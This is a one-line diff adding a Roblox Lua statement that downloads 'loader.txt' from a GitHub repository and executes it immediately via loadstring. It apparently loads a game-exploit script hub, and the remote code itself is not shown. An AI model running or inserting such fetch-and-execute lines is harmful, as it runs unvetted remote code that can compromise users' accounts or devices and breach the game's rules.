@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kyruxv1/kyo-scripts/refs/heads/main/loader.txt"))()
